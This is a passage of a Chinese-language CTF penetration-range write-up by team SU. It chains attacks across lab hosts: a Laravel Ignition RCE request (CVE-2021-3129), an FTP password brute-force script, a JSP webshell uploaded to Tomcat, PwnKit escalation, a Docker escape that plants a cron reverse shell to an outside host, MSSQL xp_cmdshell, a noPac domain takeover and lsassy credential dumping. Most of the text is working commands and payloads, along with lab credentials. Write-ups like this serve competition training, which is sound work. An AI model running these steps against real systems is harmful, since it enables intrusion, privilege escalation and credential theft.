<h3><span id="laravel-192-168-30-13">Laravel : 192.168.30.13</span><a href="#laravel-192-168-30-13" class="header-anchor"></a></h3><p>laravel经典漏洞 <code>/_ignition/execute-solution debug rce CVE-2021-3129</code><br>这个靶场的这个题是今年网鼎决赛-渗透赛道的原题，本人刚好参加并且网鼎决赛现场做出。<br>，思路为<code>任意文件读获取log位置，debug打反序列化rce</code><br>任意文件读的接口如下 &#x2F;api&#x2F;file</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一步步读框架文件，读到配置文件</span><br><span class="line">http://192.168.30.13/api/file?filename=/var/www/html/laravel/config/logging.php</span><br><span class="line">找到日志文件位置logs/tmplog/laravel_log.log</span><br></pre></td></tr></table></figure>
<p>直接用网的exp，注意就是把log位置都改一下<br>例如</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.30.13</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 326</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"> &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line"> &quot;parameters&quot;: &#123;</span><br><span class="line">  &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">  &quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/tmplog/laravel_log.log&quot;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在&#x2F;var&#x2F;www&#x2F;html&#x2F;laravel&#x2F;public&#x2F;写一个木马后可以访问，发现home目录下有flag和hint</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/home) $ cat flag.txt</span><br><span class="line">flag&#123;6855969e-7557-4bf4-9c8c-f5f80ee8e666&#125;</span><br><span class="line">(www-data:/home) $ cat .hint.txt</span><br><span class="line">hint: </span><br><span class="line">FTP:</span><br><span class="line">ftpuser</span><br><span class="line">SecretData_xxxx!@#</span><br><span class="line">xxxx is four-digit!</span><br></pre></td></tr></table></figure>
<p>这个hint就是下一步用的</p>
<h3><span id="ftp-192-168-30-19">FTP : 192.168.30.19</span><a href="#ftp-192-168-30-19" class="header-anchor"></a></h3><p>根据上面的提示 ftp密码是SecretData_xxxx!@#，<br>写一个脚本生成</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python exp.py &gt; passwd.txt</span></span><br><span class="line">password=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;SecretData_&#x27;</span> + <span class="built_in">str</span>(i)+ <span class="built_in">str</span>(j)+ <span class="built_in">str</span>(m)+ <span class="built_in">str</span>(m) + <span class="string">&quot;!@#&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>用超级弱口令导入用户名ftpuser，密码passwd.txt爆破</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.30.19----FTP----21----ftpuser----SecretData_7689!@#</span><br></pre></td></tr></table></figure>
<p>连接发现有个报错<code>500 Illegal PORT command. 425 Use PORT or PASV first.</code><br>网上找了一下为啥，尝试<code>quote PASV</code> 改成被动模式，用windows的资源管理器打开发现可以复制出来了<br>获取到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5923d77e-0765-4701-bc2d-fc1188fe953b&#125;</span><br></pre></td></tr></table></figure>


<h1><span id="2023-05-18-day2">2023 05 18 day2</span><a href="#2023-05-18-day2" class="header-anchor"></a></h1><h2><span id="dmz-qu">DMZ区</span><a href="#dmz-qu" class="header-anchor"></a></h2><h3><span id="tomcat-rce">Tomcat-RCE</span><a href="#tomcat-rce" class="header-anchor"></a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">弱口令</span><br><span class="line"></span><br><span class="line">admin:admin123!@#,有可能记错</span><br></pre></td></tr></table></figure>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;FORM METHOD=GET ACTION=<span class="string">&#x27;evil.jsp&#x27;</span>&gt;</span><br><span class="line">    &lt;INPUT name=<span class="string">&#x27;cmd&#x27;</span> type=text&gt;</span><br><span class="line">    &lt;INPUT type=submit value=<span class="string">&#x27;Run&#x27;</span>&gt;</span><br><span class="line">    &lt;/FORM&gt;</span><br><span class="line">    &lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">    &lt;%</span><br><span class="line">       <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">       <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">       <span class="keyword">if</span>(cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">             <span class="type">BufferedReader</span> <span class="variable">sI</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span></span><br><span class="line">    <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">             <span class="keyword">while</span>((s = sI.readLine()) != <span class="literal">null</span>) &#123; output += s+<span class="string">&quot;&lt;/br&gt;&quot;</span>; &#125;</span><br><span class="line">          &#125;  <span class="keyword">catch</span>(IOException e) &#123;   e.printStackTrace();   &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    %&gt;</span><br><span class="line">    &lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf ../webshell.war * # 生成war包上传</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user1:asd123 #ssh口令</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">登陆上去为user1用户需要提权，用户目录下应该有一个poc.c文件，pwnkit提权:CVE-2021-4034</span></span><br><span class="line">gcc poc.c -o poc, ./poc</span><br></pre></td></tr></table></figure>

<h2><span id="nei-wang">内网</span><a href="#nei-wang" class="header-anchor"></a></h2><h3><span id="docker-rong-qi">docker容器</span><a href="#docker-rong-qi" class="header-anchor"></a></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tomcat进去应该能翻到一个ssh口令</span></span><br><span class="line">root:deploy-20231212</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">端口:10022</span></span><br><span class="line">用这个口令去连内网中存在这个端口的服务器，上去是docker容器</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 特权容器逃逸操作</span></span></span><br><span class="line">fdisk -l # 查看磁盘文件</span><br><span class="line">mkdir /tmp/data #新建临时文件</span><br><span class="line">mount /dev/vda1 /tmp/data # 挂着宿主机目录</span><br><span class="line">echo &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.3.2/8888 0&gt;&amp;1&#x27; &gt;&gt; /tmp/data/var/spool/cron/crontabs/root # 写入定时文件反弹shell</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 逃逸成功后，在宿主机上查看另外一个容器,可以发现一个数据库密码</span></span></span><br><span class="line">sa:_H66rCce2psF4D5E8v2B6x3:master</span><br></pre></td></tr></table></figure>



<h3><span id="sqlserverrce">SqlServerRCE</span><a href="#sqlserverrce" class="header-anchor"></a></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sa:_H66rCce2psF4D5E8v2B6x3:master # 用户名:密码:数据库</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kali中 安装impacket的包, 里面有这个模块</span></span><br><span class="line">impacket-mssqlclient -db master sa:_H66rCce2psF4D5E8v2B6x3@192.168.153.147 #链接远程数据库</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 按照工具提示，启动一下xp_cmdshell,就可以执行命令了</span></span></span><br></pre></td></tr></table></figure>



<h2><span id="he-xin-nei-wang">核心内网</span><a href="#he-xin-nei-wang" class="header-anchor"></a></h2><h3><span id="nopac-rce">NoPAC-RCE</span><a href="#nopac-rce" class="header-anchor"></a></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在sqlserver服务器中翻到的账户密码，直接用nopac来打，直接获得一个shell</span></span><br><span class="line">python3 ./noPac.py lab.local/test:&#x27;1qaz@WSX&#x27; -dc-ip 192.168.153.148 -use-ldap -shell --impersonate administrator</span><br></pre></td></tr></table></figure>



<h3><span id="hash">hash</span><a href="#hash" class="header-anchor"></a></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打完NoPAC-RCE后, 可以翻到一个密码提示文件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">最终密码为: user:LAB2022!@#_summer</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在终端中输入注意用<span class="string">&#x27;\&#x27;</span>来转义一下<span class="string">&#x27;!&#x27;</span>, 返回到<span class="built_in">hash</span>就能其中一个就是flag, 会有flag字样提示的</span></span><br><span class="line">cme smb 192.168.153.149 -u &quot;user&quot; -p &quot;LAB2022\!@#_summer&quot; -M lsassy </span><br></pre></td></tr></table></figure>

</div><div class="article-licensing box"><div class="licensing-title"><p>2023 贵阳大数据网络安全精英对抗赛 SU Writeup</p><p><a href="https://team-su.github.io/posts/39677.html">https://team-su.github.io/posts/39677.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2023-08-24</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-07-13</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/40828.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2023 巅峰极客决赛  SU WriteUp</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/45913.html"><span class="level-item">2023 WMCTF SU Write-Up</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><!--!--></body></html>